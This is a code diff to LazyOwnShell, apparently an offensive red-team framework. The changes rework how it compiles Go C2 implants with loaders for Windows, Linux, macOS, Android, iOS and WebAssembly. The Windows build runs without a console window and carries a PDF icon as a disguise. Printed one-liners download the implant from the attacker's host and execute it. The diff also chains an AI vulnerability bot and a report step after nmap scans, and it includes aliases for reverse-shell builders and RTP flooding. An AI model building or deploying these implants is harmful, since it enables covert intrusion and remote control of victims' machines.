@@ -106,6 +106,7 @@ class LazyOwnShell(cmd2.Cmd):
     lport = config.lport
     c2_port = config.c2_port
     device = config.device
+    api_key = config.api_key
 
     aliases = {
         "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
@@ -179,7 +180,7 @@ class LazyOwnShell(cmd2.Cmd):
         "pwnat": "sh pwnat -s 8080",
         "q": "exit",
         "qq": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazyquit.ls\"",
-        "report":"sh python3 report.py",
+        "report":f"sh export GROQ_API_KEY='{api_key}' && python3 report.py",
         "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
         "randomuser": "sh curl 'https://randomuser.me/api/' -H 'Accept: application/json' | jq",
         "rustrevmakerwin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh windows {lhost} {lport}",
@@ -1162,6 +1163,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"rhost must be assign, {GREEN}help assign to more info {RESET}")
             return
         self.cmd(f"{path}/modules/lazynmap.sh -t {target_ip}")
+        self.onecmd("vulnbot_groq")
+        self.onecmd("report")
         return
 
     @cmd2.with_category(scanning_category)
@@ -1316,6 +1319,7 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         self.cmd(f"{path}/modules/lazynmap.sh -t {line}")
         self.onecmd("vulnbot_groq")
+        self.onecmd("report")
         return
 
     @cmd2.with_category(scanning_category)
@@ -10954,15 +10958,15 @@ class LazyOwnShell(cmd2.Cmd):
         monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
         #lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
         lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
-        implant_go = implantgo + ".go"
+        implant_go = "main.go"
         implant_go2 = implantgo + "_l.go"
         #implant_go_ws = implantgo_ws + ".go"
         if platform == "windows":
             implantgo += ".exe"
             implantgo2 += "_l.exe"
             #implantgo_ws += ".exe"
-
-        with open(implant_go, 'w+') as f:
+        beacon = f"sessions/{implant_go}"
+        with open(beacon, 'w+') as f:
             f.write(content)
 
         #with open(implant_go_ws, 'w+') as f:
@@ -10976,11 +10980,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         with open(f"{monrevlin}", 'w+') as f:
             f.write(monrevlin_content)
-        cmd = "cd sessions ; rm go.mod ; go mod init implant"
+        cmd = "cd sessions ; rm go.mod ; go mod init main ; go mod tidy ; cp implant/loader_*.go . ; go get golang.org/x/sys/windows"
         self.cmd(cmd)
         if platform == "linux":
+            loader = "loader_linux.go"
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
             #compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             #compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
@@ -11018,7 +11023,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "windows":
             binary = f"{line}.exe"
-
+            loader = "loader_windows.go"
             tool_to_check = "rsrc"
             if check_go_tool_installed(tool_to_check):
                 print_msg(f"Tool '{tool_to_check}' is installed.")
@@ -11029,7 +11034,7 @@ class LazyOwnShell(cmd2.Cmd):
             icon_command = f"rsrc -ico static/pdf.ico -o sessions/icon.syso"
             self.cmd(icon_command)
 
-            compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w -H=windowsgui\" -o {implantgo} {implant_go}"
+            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w -H=windowsgui\" -o {implantgo} {implant_go} {loader}"
             #compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             #compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
@@ -11057,7 +11062,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "darwin":
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            loader = "loader_linux.go"
+            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=darwin CC=x86_64-apple-darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             #compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
@@ -11071,7 +11077,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "android":
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            loader = "loader_linux.go"
+            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             #compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
@@ -11085,7 +11092,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "ios":
             binary = line
-            compile_command = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            loader = "loader_linux.go"
+            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1  CC=x86_64-apple-darwin GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
             compile_command2 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             #compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
@@ -11099,7 +11107,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "webassembly":
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            loader = "loader_linux.go"
+            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
             #compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
@@ -11112,10 +11121,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(upx)
 
         print_msg(f"Go agent {implantgo} compiled successfully.")
-        cmd_fmt = f"go fmt {implant_go}"
-        cmd_vet = f"go vet {implant_go}"
-        self.cmd(cmd_fmt)
-        self.cmd(cmd_vet)
+
 
         md5 = f"md5sum {self.sessions_dir}/{binary}"
         md5sum = self.cmd(md5)
